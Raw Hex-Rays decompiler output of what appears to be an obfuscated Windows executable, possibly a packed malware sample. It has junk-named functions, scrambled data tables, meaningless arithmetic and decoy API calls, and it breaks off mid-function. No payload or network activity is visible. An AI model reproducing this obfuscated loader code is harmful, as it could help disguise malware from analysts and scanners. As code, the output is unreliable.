/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// BOOL __stdcall GetMessageW(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
// int __stdcall LookupIconIdFromDirectory(PBYTE presbits, BOOL fIcon);
// void __stdcall mouse_event(DWORD dwFlags, DWORD dx, DWORD dy, DWORD dwData, ULONG_PTR dwExtraInfo);
// BOOL __stdcall DrawIcon(HDC hDC, int X, int Y, HICON hIcon);
// BOOL __stdcall AppendMenuA(HMENU hMenu, UINT uFlags, UINT_PTR uIDNewItem, LPCSTR lpNewItem);
// BOOL __stdcall UnloadKeyboardLayout(HKL hkl);
// HCURSOR __stdcall CreateCursor(HINSTANCE hInst, int xHotSpot, int yHotSpot, int nWidth, int nHeight, const void *pvANDPlane, const void *pvXORPlane);
// int __stdcall GetKeyboardType(int nTypeFlag);
// BOOL __stdcall OpenIcon(HWND hWnd);
// DWORD __stdcall SetClassLongW(HWND hWnd, int nIndex, LONG dwNewLong);
// int __stdcall wvsprintfA(LPSTR, LPCSTR, va_list arglist);
// BOOL __stdcall CreateCaret(HWND hWnd, HBITMAP hBitmap, int nWidth, int nHeight);
// BOOL __stdcall PathMakePrettyW(LPWSTR pszPath);
// int __stdcall StrSpnA(PCSTR psz, PCSTR pszSet);
// BOOL __stdcall RemoveDirectoryA(LPCSTR lpPathName);
// BOOL __stdcall GetCommState(HANDLE hFile, LPDCB lpDCB);
// UINT __stdcall GetWindowsDirectoryA(LPSTR lpBuffer, UINT uSize);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// LONG __stdcall InterlockedExchange(volatile LONG *Target, LONG Value);
// DWORD __stdcall GetCurrentThreadId();
// HANDLE __stdcall OpenFileMappingW(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCWSTR lpName);
// LPVOID __stdcall LockResource(HGLOBAL hResData);
// BOOL __stdcall AreFileApisANSI();
// LONG __stdcall InterlockedExchangeAdd(volatile LONG *Addend, LONG Value);
// DWORD __stdcall GetCurrentProcessId();
// HWND __stdcall ReplaceTextW(LPFINDREPLACEW);
// BOOL __stdcall ChooseColorW(LPCHOOSECOLORW);
// HRESULT __stdcall PrintDlgExW(LPPRINTDLGEXW pPD);
// BOOL __stdcall GetOpenFileNameW(LPOPENFILENAMEW);
// int __cdecl stricmp(const char *String1, const char *String2);
// BOOL __stdcall EndPath(HDC hdc);
// UINT __stdcall SetPaletteEntries(HPALETTE hpal, UINT iStart, UINT cEntries, const PALETTEENTRY *pPalEntries);
// HDC __stdcall CreateDCW(LPCWSTR pwszDriver, LPCWSTR pwszDevice, LPCWSTR pszPort, const DEVMODEW *pdm);
// int __stdcall SetBkMode(HDC hdc, int mode);
// BOOL __stdcall GetTextExtentExPointW(HDC hdc, LPCWSTR lpszString, int cchString, int nMaxExtent, LPINT lpnFit, LPINT lpnDx, LPSIZE lpSize);
// COLORREF __stdcall SetPixel(HDC hdc, int x, int y, COLORREF color);
_DWORD sub_4017D8(); // weak
void __stdcall qznlacy(unsigned int *); // idb
void __stdcall x_gYC_SVW_BZcpszCXd(bool *a1);
// void __userpurge _MP__ipwIML_WGzqh_(unsigned int a1@<ecx>, unsigned int a2@<ebx>, unsigned int a3@<esi>, int a4, int *a5);
void __stdcall RTXjyh_h_o_t_hET_Z(int *a1);
void __stdcall gri__vazkAELP__nI___Z(__int16 a1);
void __stdcall WWcb_tysgYEF(unsigned __int8 a1);
// void __userpurge _sotycly_kwgceopzn_crf(__int64 a1@<ebx:ecx>, __int16 *a2);
void __stdcall ___P___U_VBXU_VKy(int *a1, int a2);
// int __usercall sub_403AD0@<eax>(_DWORD *a1@<eax>);
void __fastcall hb___hg_NVCNBjqh(int a1, unsigned int a2, char a3);
// void __userpurge zrFTwfs_lb(unsigned int a1@<ecx>, unsigned int a2@<esi>, unsigned __int16 a3);
// unsigned int __userpurge _g_a_n_jm_q_sx@<eax>(unsigned int result@<eax>, unsigned int a2, __int16 a3);
int sub_403BC3();
int __stdcall sub_403DB3(int a1, int a2, int a3);
int __stdcall sub_403DE3(int a1, _DWORD *a2);
int __stdcall sub_403FB9(int a1, int a2, int a3);
// int __usercall sub_40417E@<eax>(int a1@<ebp>, unsigned int a2@<edi>, unsigned int *a3@<esi>);
// LONG __usercall sub_40422E@<eax>(unsigned int a1@<edi>, LONG *a2@<esi>);
int sub_4042D0();
int sub_4043E1();
unsigned int *__stdcall sub_404505(int a1, int a2, void (__stdcall *a3)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD), int a4);
int __stdcall sub_404673(int a1, int a2);
int sub_404AA0();
// int __usercall sub_404EC0@<eax>(unsigned int a1@<edi>);
// int __usercall sub_4050E5@<eax>(unsigned int a1@<ebx>, unsigned int a2@<edi>);
int sub_4052AC();
int sub_4053C3();
// int __usercall sub_4054E3@<eax>(unsigned int a1@<edi>);
// int __userpurge sub_40590B@<eax>(__int16 a1@<ax>, unsigned __int16 a2);
// int __userpurge sub_405974@<eax>(char a1@<al>, unsigned __int8 a2);
// int __userpurge sub_4059DC@<eax>(int a1@<edi>, unsigned int a2@<esi>, _DWORD *a3, unsigned int *a4, _DWORD *a5, _DWORD *a6, _DWORD *a7, _DWORD *a8, _DWORD *a9, unsigned int *a10);
// int __userpurge start@<eax>(unsigned int a1@<ebx>, unsigned int a2@<edi>, unsigned int a3@<esi>, int a4);
void __stdcall cyflorvyce_a_LBPMgm__(int a1, char a2);
// void *__cdecl memset(void *, int Val, size_t Size);
// int __userpurge sub_4061DE@<eax>(unsigned int a1@<ebx>, int a2, int a3, int *a4);
int __cdecl sub_4068C5(char *a1, int a2, int a3, int a4);
// void __userpurge Cn_zb_kimt(unsigned int a1@<ebx>, int a2);
void __stdcall _GB_EN_JsqcfcxodtJ_n_j(unsigned __int16 *a1);
// unsigned int __userpurge ti_o__o_s@<eax>(unsigned int result@<eax>, __int16 *a2);

//-------------------------------------------------------------------------
// Data declarations

void ***off_407040 = &off_40703C; // weak
void ***off_407058 = &off_407054; // weak
int (**off_407080)[459] = &off_407068; // weak
int **off_407084 = &off_407074; // weak
int dword_407090 = 0; // weak
int dword_407094 = -8243; // weak
int dword_407098 = -12323; // weak
int dword_40709C = 15917; // weak
int dword_4070A0 = 11837; // weak
int *off_4070D4[4] = { &dword_407094, &dword_407098, &dword_40709C, &dword_4070A0 }; // weak
int dword_4070EC = 0; // weak
_DWORD dword_4070F0 = 0; // idb
_DWORD dword_4070F4 = 0; // idb
int dword_407100 = 0; // weak
int dword_407104 = 0; // weak
void *off_40711C = &unk_407108; // weak
_UNKNOWN unk_4071A4; // weak
int **off_4072D8 = &off_407110; // weak
LONG Target = 126223975; // idb
_DWORD dword_4072F0 = 88433765; // idb
_DWORD dword_4072F4 = 88561524; // idb
int dword_4072F8 = 0; // weak
double (*off_4072FC)() = &sub_4017D8; // weak
int dword_407300 = 106390533; // weak
int dword_407304 = 106193926; // weak
int dword_407308 = 6624267; // weak
int dword_40730C = 15080039; // weak
int (__stdcall *off_407310)(_DWORD, _DWORD, _DWORD) = &sub_403DB3; // weak
int dword_407314 = 489240; // weak
int dword_407318 = 108336920; // weak
int dword_40731C = 395032; // weak
int dword_407320 = 124082023; // weak
__int16 word_407340[130] =
{
  -31207,
  -27111,
  -23015,
  -18919,
  -14823,
  -10727,
  -6631,
  -2535,
  1561,
  5657,
  9753,
  13849,
  17945,
  22041,
  26137,
  30233,
  -31463,
  -31719,
  -29927,
  -30183,
  -30439,
  -30695,
  -28903,
  -29159,
  32025,
  31769,
  -31975,
  -32231,
  -32487,
  -32743,
  -30951,
  -31127,
  -31111,
  -31159,
  -31143,
  -31063,
  -31047,
  -31095,
  -31079,
  -30999,
  -30727,
  -30775,
  -30759,
  -31191,
  -31175,
  -31223,
  -31208,
  -31209,
  -31210,
  -31211,
  -31212,
  -31213,
  -31214,
  -31215,
  -31216,
  -31121,
  -31122,
  -31203,
  -31204,
  -31205,
  -31206,
  -31207,
  -27111,
  -23015,
  -18919,
  -14823,
  -10727,
  -6631,
  -2535,
  1561,
  5657,
  9753,
  13849,
  17945,
  22041,
  26137,
  30233,
  -31463,
  -31719,
  -29927,
  -30183,
  -30439,
  -30695,
  -28903,
  -29159,
  32025,
  31769,
  -31975,
  -32231,
  -32487,
  -32743,
  -30951,
  -31127,
  -31111,
  -31159,
  -31143,
  -31063,
  -31047,
  -31095,
  -31079,
  -30999,
  -30727,
  -30775,
  -30759,
  -31191,
  -31175,
  -31223,
  -31208,
  -31209,
  -31210,
  -31211,
  -31212,
  -31213,
  -31214,
  -31215,
  -31216,
  -31121,
  -31122,
  -31203,
  -31204,
  -31205,
  -31206,
  -27289,
  29976,
  16952,
  -31208,
  11465,
  24632,
  -6635,
  0
}; // idb
int dword_40749C = -4109; // weak
int dword_4074B8 = 3417353; // weak
__int16 word_4074BC = -296; // weak
__int16 word_4074C4 = 24678; // weak
int dword_4074CC = 488810; // weak
int dword_4074D0 = 489335; // weak
_UNKNOWN unk_4074D4; // weak
char byte_4074D7[] = { '\b' }; // weak
int dword_4074D8 = 271366; // weak
int dword_4074EC = 0; // weak
_UNKNOWN unk_4074F0; // weak
int dword_407514 = 0; // weak
_BYTE byte_407520[4] = { -112, 0, 0, 0 }; // idb
char String2[] = "KJDjkkIDiuoif"; // idb
char String1[] = "JUDkjkKDK"; // idb
int dword_407548 = 7894550; // weak
int dword_40754C = 3479004; // weak
int dword_407550 = 144131956; // weak
int dword_407554 = 1988494392; // weak
CHAR pszSet[3] = "ks"; // idb
CHAR psz[] = "sdjlksd"; // idb
int (__cdecl *off_407580)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = &sub_4068C5; // weak
_DWORD off_407584 = 4219358; // idb
_UNKNOWN unk_407638; // weak
_BYTE byte_407640[336] =
{
  0,
  0,
  0,
  0,
  0,
  0,
  44,
  72,
  90,
  53,
  88,
  32,
  57,
  32,
  95,
  119,
  120,
  54,
  32,
  72,
  0,
  57,
  48,
  32,
  99,
  117,
  52,
  54,
  115,
  66,
  63,
  0,
  68,
  116,
  110,
  32,
  68,
  55,
  73,
  115,
  84,
  122,
  51,
  54,
  32,
  117,
  114,
  116,
  49,
  56,
  73,
  44,
  116,
  113,
  122,
  32,
  32,
  50,
  33,
  109,
  71,
  104,
  53,
  117,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  50,
  122,
  101,
  32,
  74,
  56,
  69,
  77,
  80,
  53,
  120,
  101,
  68,
  110,
  77,
  69,
  0,
  83,
  86,
  89,
  105,
  111,
  57,
  81,
  72,
  50,
  32,
  101,
  51,
  71,
  112,
  65,
  101,
  45,
  113,
  112,
  32,
  100,
  63,
  53,
  97,
  32,
  112,
  74,
  119,
  52,
  55,
  32,
  32,
  76,
  54,
  0,
  32,
  116,
  56,
  105,
  98,
  69,
  0,
  0,
  104,
  101,
  54,
  65,
  106,
  33,
  108,
  85,
  44,
  0,
  98,
  65,
  103,
  118,
  74,
  103,
  32,
  77,
  118,
  115,
  51,
  85,
  50,
  107,
  44,
  102,
  56,
  0,
  114,
  103,
  120,
  117,
  81,
  32,
  52,
  49,
  52,
  0,
  118,
  120,
  51,
  86,
  49,
  103,
  83,
  52,
  32,
  102,
  52,
  0,
  118,
  0,
  55,
  48,
  32,
  66,
  69,
  77,
  56,
  32,
  75,
  45,
  67,
  0,
  103,
  120,
  98,
  32,
  67,
  108,
  75,
  67,
  70,
  0,
  97,
  48,
  72,
  0,
  32,
  112,
  76,
  0,
  90,
  0,
  50,
  0,
  32,
  50,
  54,
  63,
  32,
  71,
  0,
  0,
  102,
  99,
  46,
  51,
  122,
  68,
  48,
  69,
  111,
  56,
  51,
  71,
  44,
  54,
  50,
  97,
  0,
  0,
  32,
  84,
  32,
  90,
  50,
  78,
  81,
  0,
  56,
  118,
  53,
  109,
  102,
  118,
  85,
  101,
  89,
  101,
  98,
  104,
  0,
  0,
  0,
  119,
  48,
  56,
  53,
  97,
  102,
  45,
  109,
  111,
  49,
  56,
  100,
  52,
  87,
  52,
  32,
  63,
  116,
  78,
  33,
  0,
  55,
  49,
  122,
  98,
  53,
  103,
  72,
  0,
  32,
  48,
  105,
  52,
  0,
  0,
  52,
  0,
  48,
  108,
  33,
  75,
  115,
  56,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // idb
int dword_407FA8 = 1070606; // weak
int dword_407FAC = 1081060; // weak
int dword_407FB0 = 1063457; // weak
int dword_407FB4 = 1058210; // weak
int dword_407FB8 = 1052705; // weak
int dword_407FBC = 1080201; // weak
int dword_407FC0 = 1073875; // weak
int dword_407FC4 = 1077728; // weak
int dword_407FC8 = 1077672; // weak
int dword_407FCC = 1063030; // weak
struct tagMSG Msg = { (HWND)0x1073F3, 1055413u, 1062846u, 1074404, 1075237u, { 1062905, 1052324 } }; // idb
int dword_407FF0 = 1081180; // weak
int dword_407FF4 = 1063293; // weak
int dword_407FF8 = 1074928; // weak
int dword_407FFC = 1050882; // weak
int dword_408000 = 1059256; // weak
int dword_408004 = 1073217; // weak
int dword_408008 = 1059417; // weak
struct _DCB stru_40800C =
{
  1055724u,
  1068241u,
  1u,
  0u,
  0u,
  1u,
  3u,
  0u,
  1u,
  1u,
  0u,
  0u,
  1u,
  0u,
  0u,
  32u,
  745u,
  16u,
  27536u,
  16u,
  0u,
  38u,
  'I',
  '\x10',
  '\0',
  '6',
  'm',
  16u
}; // idb
int dword_408028 = 1048640; // weak
int dword_40802C = 1075296; // weak
struct tagMSG stru_408030 = { (HWND)0x102F73, 1077843u, 1072668u, 1066868, 1075077u, { 1051771, 1049037 } }; // idb
CHAR Buffer[] = { ')', 'Z', '\x10', '\0' }; // idb
int dword_408050 = 1063244; // weak
int dword_408054 = 1077163; // weak
int dword_408058 = 1076201; // weak
int dword_40805C = 1050895; // weak
int dword_408060 = 1076274; // weak
int dword_408064 = 1049209; // weak
int dword_408068 = 1077824; // weak
int dword_40806C = 1078786; // weak
int dword_408070 = 1077419; // weak
int dword_408074 = 1061206; // weak
int dword_408078 = 1070610; // weak
int dword_40807C = 1051030; // weak
int dword_408080 = 1067021; // weak
int dword_408084 = 1050384; // weak
int dword_408088 = 1051264; // weak
int dword_40808C = 1077177; // weak
int dword_408090 = 1056419; // weak
_UNKNOWN unk_408094; // weak
CHAR DCB[] =
{
  'A',
  '?',
  '\x10',
  '\0',
  '“',
  'G',
  '\x10',
  '\0',
  'ü',
  'K',
  '\x10',
  '\0',
  '\x10',
  'B',
  '\x10',
  '\0',
  '8',
  'q',
  'z',
  '9',
  '0',
  ' ',
  'C',
  'C',
  'k',
  '.',
  '\0',
  'K'
}; // idb
int *off_4080CE[11] =
{
  &dword_407FA8,
  &dword_407FAC,
  &dword_407FB0,
  &dword_407FB4,
  &dword_407FB8,
  &dword_407FBC,
  &dword_407FC0,
  &dword_407FC4,
  &dword_407FC8,
  &dword_407FCC,
  &dword_407FD0
}; // weak
int *off_4080D2[10] =
{
  &dword_407FAC,
  &dword_407FB0,
  &dword_407FB4,
  &dword_407FB8,
  &dword_407FBC,
  &dword_407FC0,
  &dword_407FC4,
  &dword_407FC8,
  &dword_407FCC,
  &dword_407FD0
}; // weak
int *off_4080D6[9] =
{
  &dword_407FB0,
  &dword_407FB4,
  &dword_407FB8,
  &dword_407FBC,
  &dword_407FC0,
  &dword_407FC4,
  &dword_407FC8,
  &dword_407FCC,
  &dword_407FD0
}; // weak
int *off_4080DA[8] =
{
  &dword_407FB4,
  &dword_407FB8,
  &dword_407FBC,
  &dword_407FC0,
  &dword_407FC4,
  &dword_407FC8,
  &dword_407FCC,
  &dword_407FD0
}; // weak
int *off_4080DE[7] =
{
  &dword_407FB8,
  &dword_407FBC,
  &dword_407FC0,
  &dword_407FC4,
  &dword_407FC8,
  &dword_407FCC,
  &dword_407FD0
}; // weak
int *off_4080E2[6] =
{
  &dword_407FBC,
  &dword_407FC0,
  &dword_407FC4,
  &dword_407FC8,
  &dword_407FCC,
  &dword_407FD0
}; // weak
int *off_4080E6[5] = { &dword_407FC0, &dword_407FC4, &dword_407FC8, &dword_407FCC, &dword_407FD0 }; // weak
int *off_4080F6 = &dword_407FD0; // weak
tagMSG *off_4080FA = &Msg; // weak
void *off_408102 = (void *)0x407FDC; // weak
void *off_40810E = (void *)0x407FE8; // weak
void *off_408112 = (void *)0x407FEC; // weak
int *off_408116[7] =
{
  &dword_407FF0,
  &dword_407FF4,
  &dword_407FF8,
  &dword_407FFC,
  &dword_408000,
  &dword_408004,
  &dword_408008
}; // weak
int *off_40811A[6] =
{
  &dword_407FF4,
  &dword_407FF8,
  &dword_407FFC,
  &dword_408000,
  &dword_408004,
  &dword_408008
}; // weak
int *off_40811E[5] = { &dword_407FF8, &dword_407FFC, &dword_408000, &dword_408004, &dword_408008 }; // weak
int *off_408122[4] = { &dword_407FFC, &dword_408000, &dword_408004, &dword_408008 }; // weak
int *off_408126[3] = { &dword_408000, &dword_408004, &dword_408008 }; // weak
int *off_40812A[2] = { &dword_408004, &dword_408008 }; // weak
int *off_40812E = &dword_408008; // weak
_DCB *off_408132 = &stru_40800C; // weak
void *off_408136 = (void *)0x408010; // weak
void *off_40813A = (void *)0x408014; // weak
void *off_40813E = (void *)0x408018; // weak
void *off_408146 = (void *)0x408020; // weak
int *off_40814E[2] = { &dword_408028, &dword_40802C }; // weak
int *off_408152 = &dword_40802C; // weak
void *off_40815E = (void *)0x408038; // weak
void *off_40816A = (void *)0x408044; // weak
int *off_408182[14] =
{
  &dword_40805C,
  &dword_408060,
  &dword_408064,
  &dword_408068,
  &dword_40806C,
  &dword_408070,
  &dword_408074,
  &dword_408078,
  &dword_40807C,
  &dword_408080,
  &dword_408084,
  &dword_408088,
  &dword_40808C,
  &dword_408090
}; // weak
int *off_408196[9] =
{
  &dword_408070,
  &dword_408074,
  &dword_408078,
  &dword_40807C,
  &dword_408080,
  &dword_408084,
  &dword_408088,
  &dword_40808C,
  &dword_408090
}; // weak
int *off_40819A[8] =
{
  &dword_408074,
  &dword_408078,
  &dword_40807C,
  &dword_408080,
  &dword_408084,
  &dword_408088,
  &dword_40808C,
  &dword_408090
}; // weak
int *off_40819E[7] =
{
  &dword_408078,
  &dword_40807C,
  &dword_408080,
  &dword_408084,
  &dword_408088,
  &dword_40808C,
  &dword_408090
}; // weak
int *off_4081B2[2] = { &dword_40808C, &dword_408090 }; // weak
int *off_4081B6 = &dword_408090; // weak
void *off_4081C2 = (void *)0x40809C; // weak
void *off_4081C6 = (void *)0x4080A0; // weak
void *off_4081CA = (void *)0x4080A4; // weak
CHAR aAhc84mz3gpw[] = "AHC_84MZ_3GPW"; // idb
CHAR aEow5178p9euk9[] = "EOW5_178P_9EUK9"; // idb
CHAR PathName[] = "IQ279_7WE_WM36L"; // idb
CHAR aDrp4J754w9ynw[] = "DRP4_J754W_9YNW"; // idb
CHAR NewItem[] = "Q3V4_2PE2_5"; // idb
WCHAR szString = 85u; // idb
WCHAR pwszDevice[] = L"T4L_TQG"; // idb
WCHAR pwszDriver[] = L"U2E_6XVVK_QMW"; // idb


//----- (004017D8) --------------------------------------------------------
#error "4017FD: cannot convert to microcode (funcsize=16)"

//----- (004038AC) --------------------------------------------------------
void __stdcall qznlacy(unsigned int *a1)
{
  dword_40805C &= *(_DWORD *)off_40813A;
  dword_408000 += *(_DWORD *)off_40816A;
  stru_408030.wParam = dword_407FC0 | LOBYTE(stru_408030.wParam);
}
// 407FC0: using guessed type int dword_407FC0;
// 408000: using guessed type int dword_408000;
// 40805C: using guessed type int dword_40805C;
// 40813A: using guessed type void *off_40813A;
// 40816A: using guessed type void *off_40816A;

//----- (004038F3) --------------------------------------------------------
void __stdcall x_gYC_SVW_BZcpszCXd(bool *a1)
{
  unsigned int v1; // edi
  unsigned int v2; // [esp+4h] [ebp-1Ch]

  v1 = LOWORD(stru_40800C.DCBlength);
  *(_DWORD *)off_408136 ^= LOWORD(stru_40800C.DCBlength);
  *(_DWORD *)DCB = *off_408152 + (v2 < v1) + *(unsigned __int16 *)DCB;
  *(_DWORD *)off_40813E ^= dword_407FC0;
}
// 403908: variable 'v2' is possibly undefined
// 407FC0: using guessed type int dword_407FC0;
// 408136: using guessed type void *off_408136;
// 40813E: using guessed type void *off_40813E;
// 408152: using guessed type int *off_408152;

//----- (00403932) --------------------------------------------------------
void __userpurge _MP__ipwIML_WGzqh_(unsigned int a1@<ecx>, unsigned int a2@<ebx>, unsigned int a3@<esi>, int a4, int *a5)
{
  dword_408074 += *off_4080DE[0] + (a3 < dword_408068);
  *off_4080F6 += LOWORD(Msg.message);
  stru_408030.wParam = (__PAIR64__(stru_408030.wParam, a2) - __PAIR64__(dword_408090, a1)) >> 32;
}
// 408068: using guessed type int dword_408068;
// 408074: using guessed type int dword_408074;
// 408090: using guessed type int dword_408090;
// 4080DE: using guessed type int *off_4080DE[7];
// 4080F6: using guessed type int *off_4080F6;

//----- (0040397B) --------------------------------------------------------
void __stdcall RTXjyh_h_o_t_hET_Z(int *a1)
{
  dword_407FC8 = (unsigned __int8)(dword_408084 & dword_407FC8);
  dword_407FC0 = *off_4080D6[0] & (unsigned __int16)dword_407FC0;
  *(_DWORD *)&stru_40800C.EofChar = *(_DWORD *)off_4081C6 ^ (unsigned __int8)stru_40800C.EofChar;
}
// 407FC0: using guessed type int dword_407FC0;
// 407FC8: using guessed type int dword_407FC8;
// 408084: using guessed type int dword_408084;
// 4080D6: using guessed type int *off_4080D6[9];
// 4081C6: using guessed type void *off_4081C6;

//----- (004039C4) --------------------------------------------------------
void __stdcall gri__vazkAELP__nI___Z(__int16 a1)
{
  dword_40806C |= *off_4081B2[0];
  stru_40800C.DCBlength |= *(_DWORD *)&DCB[4];
  *(_DWORD *)&DCB[8] = (__PAIR64__(*(unsigned int *)&DCB[8], dword_408054)
                      - __PAIR64__(*(_DWORD *)off_40810E, *(unsigned int *)&DCB[4])) >> 32;
}
// 408054: using guessed type int dword_408054;
// 40806C: using guessed type int dword_40806C;
// 40810E: using guessed type void *off_40810E;
// 4081B2: using guessed type int *off_4081B2[2];

//----- (00403A10) --------------------------------------------------------
void __stdcall WWcb_tysgYEF(unsigned __int8 a1)
{
  dword_408028 |= *off_4080D2[0];
  *(_DWORD *)Buffer &= *off_40819E[0];
  dword_408080 = (unsigned __int8)(dword_408070 & dword_408080);
}
// 408028: using guessed type int dword_408028;
// 408070: using guessed type int dword_408070;
// 408080: using guessed type int dword_408080;
// 4080D2: using guessed type int *off_4080D2[10];
// 40819E: using guessed type int *off_40819E[7];

//----- (00403A57) --------------------------------------------------------
void __userpurge _sotycly_kwgceopzn_crf(__int64 a1@<ebx:ecx>, __int16 *a2)
{
  unsigned int v2; // [esp+4h] [ebp-18h]

  HIDWORD(a1) = dword_40806C;
  dword_40806C = (a1 - __PAIR64__((unsigned __int16)dword_408070, v2)) >> 32;
  *off_40819E[0] -= dword_407FAC;
  *(_DWORD *)off_408102 -= stru_408030.message;
}
// 403A6D: variable 'v2' is possibly undefined
// 407FAC: using guessed type int dword_407FAC;
// 40806C: using guessed type int dword_40806C;
// 408070: using guessed type int dword_408070;
// 408102: using guessed type void *off_408102;
// 40819E: using guessed type int *off_40819E[7];

//----- (00403A95) --------------------------------------------------------
void __stdcall ___P___U_VBXU_VKy(int *a1, int a2)
{
  dword_408070 = *(_DWORD *)&stru_40800C.XoffLim + (unsigned __int8)dword_408070;
  *off_4080D2[0] |= dword_408050;
  *off_408126[0] ^= stru_408030.pt.y;
}
// 408050: using guessed type int dword_408050;
// 408070: using guessed type int dword_408070;
// 4080D2: using guessed type int *off_4080D2[10];
// 408126: using guessed type int *off_408126[3];

//----- (00403AD0) --------------------------------------------------------
int __usercall sub_403AD0@<eax>(_DWORD *a1@<eax>)
{
  int result; // eax

  dword_407554 = (int)(a1 + 1);
  dword_407548 = a1[2];
  dword_40754C = a1[3];
  result = a1[4];
  dword_407550 = result;
  return result;
}
// 407548: using guessed type int dword_407548;
// 40754C: using guessed type int dword_40754C;
// 407550: using guessed type int dword_407550;
// 407554: using guessed type int dword_407554;

//----- (00403AF4) --------------------------------------------------------
void __fastcall hb___hg_NVCNBjqh(int a1, unsigned int a2, char a3)
{
  off_408132->DCBlength += *(_DWORD *)&DCB[12];
  *(_DWORD *)&stru_40800C.wReserved = (unsigned __int8)dword_40807C + stru_40800C.wReserved;
  *off_4080DA[0] = (__PAIR64__(*off_4080DA[0], a2) - __PAIR64__(dword_408070, *(unsigned int *)&stru_40800C.wReserved)) >> 32;
}
// 408070: using guessed type int dword_408070;
// 40807C: using guessed type int dword_40807C;
// 4080DA: using guessed type int *off_4080DA[8];
// 408132: using guessed type _DCB *off_408132;

//----- (00403B32) --------------------------------------------------------
void __userpurge zrFTwfs_lb(unsigned int a1@<ecx>, unsigned int a2@<esi>, unsigned __int16 a3)
{
  unsigned int v3; // edi

  v3 = (unsigned __int8)stru_40800C.EofChar;
  *(_DWORD *)off_4081CA &= (unsigned __int8)stru_40800C.EofChar;
  Msg.pt.y = (__PAIR64__(Msg.pt.y, *(unsigned int *)DCB) - __PAIR64__(*off_4081B6, a1)) >> 32;
  dword_407FFC = (__PAIR64__((unsigned __int16)dword_407FFC, a2) - __PAIR64__(dword_407FF4, v3)) >> 32;
}
// 407FF4: using guessed type int dword_407FF4;
// 407FFC: using guessed type int dword_407FFC;
// 4081B6: using guessed type int *off_4081B6;
// 4081CA: using guessed type void *off_4081CA;

//----- (00403B7C) --------------------------------------------------------
unsigned int __userpurge _g_a_n_jm_q_sx@<eax>(unsigned int result@<eax>, unsigned int a2, __int16 a3)
{
  dword_408064 = dword_408060 | (unsigned __int16)dword_408064;
  *off_408116[0] = (__PAIR64__(*off_408116[0], dword_408068) - __PAIR64__(Msg.time, result)) >> 32;
  *(_DWORD *)&stru_40800C.StopBits -= *off_40811E[0];
  return result;
}
// 408060: using guessed type int dword_408060;
// 408064: using guessed type int dword_408064;
// 408068: using guessed type int dword_408068;
// 408116: using guessed type int *off_408116[7];
// 40811E: using guessed type int *off_40811E[5];

//----- (00403BC3) --------------------------------------------------------
int sub_403BC3()
{
  int v0; // eax
  int v1; // eax
  __int16 v2; // dx
  int v3; // eax
  bool v4; // cf
  unsigned __int16 v5; // ax
  __int16 v6; // cx
  int v8; // [esp+20h] [ebp-40h]
  int v9; // [esp+24h] [ebp-3Ch]
  unsigned int v10; // [esp+2Ch] [ebp-34h] BYREF
  int v11; // [esp+30h] [ebp-30h] BYREF
  int v12; // [esp+34h] [ebp-2Ch]
  unsigned __int16 v13; // [esp+38h] [ebp-28h]
  int v14; // [esp+3Ch] [ebp-24h]
  int v15; // [esp+40h] [ebp-20h]
  UINT wMsgFilterMax; // [esp+44h] [ebp-1Ch]
  _WORD *v17; // [esp+54h] [ebp-Ch] BYREF
  int v18; // [esp+58h] [ebp-8h]
  int v19; // [esp+5Ch] [ebp-4h]

  v18 = 4;
  v0 = v19;
  dword_408064 = 0;
  do
  {
    if ( ++dword_408064 == 36 )
      v0 = GetMessageW(&Msg, (HWND)0x6C11, 0x1FDDu, wMsgFilterMax);
  }
  while ( (unsigned int)dword_408064 < 0x1E );
  v14 = 1111;
  v19 = (v19 ^ v0) + 1;
  v10 = (unsigned int)&v11;
  v11 -= 29432;
  v1 = v19 << v18;
  *(_DWORD *)off_40815E ^= 0x190Cu;
  v2 = 815;
  Msg.pt.x |= (unsigned int)&dword_407FCC;
  v10 |= v8;
  v19 = v1 << v18 << v18;
  v19 <<= v18;
  v3 = (int)**off_407040;
  if ( v3 > 23711 )
  {
    v4 = __CFADD__(v13, v15);
    v15 += v13;
  }
  else
  {
    v4 = 0;
  }
  v12 -= (int)&v10 + v4;
  v18 = v3;
  v17 = (_WORD *)(*(_DWORD *)v3 & ~(v19 - 1));
  v18 = (int)&v17;
  v5 = *v17 - 558;
  v6 = 23344;
  while ( ((unsigned __int16)v2 ^ v5) != v6 )
  {
    v10 -= dword_40805C;
    *(_DWORD *)v18 -= v19;
    stru_408030.pt.x = 0;
    do
    {
      if ( ++stru_408030.pt.x == 24 )
        EndPath((HDC)0x8CF2);
    }
    while ( stru_408030.pt.x < 0x10u );
    v9 = __ROR4__(v9, 7);
    v5 = **(_WORD **)v18 - 558;
  }
  return *(_DWORD *)v18;
}
// 403CB5: variable 'v8' is possibly undefined
// 403D8B: variable 'v9' is possibly undefined
// 403D9F: variable 'v2' is possibly undefined
// 403DA8: variable 'v6' is possibly undefined
// 407040: using guessed type void ***off_407040;
// 407FCC: using guessed type int dword_407FCC;
// 40805C: using guessed type int dword_40805C;
// 408064: using guessed type int dword_408064;
// 408152: using guessed type int *off_408152;
// 40815E: using guessed type void *off_40815E;

//----- (00403DB3) --------------------------------------------------------
int __stdcall sub_403DB3(int a1, int a2, int a3)
{
  dword_407094 = 7755638;
  dword_407098 = 9986422;
  dword_40709C = 4527159;
  dword_4070A0 = 15230823;
  return 8865380;
}
// 407094: using guessed type int dword_407094;
// 407098: using guessed type int dword_407098;
// 40709C: using guessed type int dword_40709C;
// 4070A0: using guessed type int dword_4070A0;

//----- (00403DE3) --------------------------------------------------------
int __stdcall sub_403DE3(int a1, _DWORD *a2)
{
  int v2; // ecx
  int **v3; // ecx
  int v4; // edx
  int v5; // eax
  int v6; // eax
  int v7; // eax
  BOOL fIcon; // [esp+1Ch] [ebp-14h]
  unsigned int v10; // [esp+20h] [ebp-10h]

  v10 = 0;
  do
  {
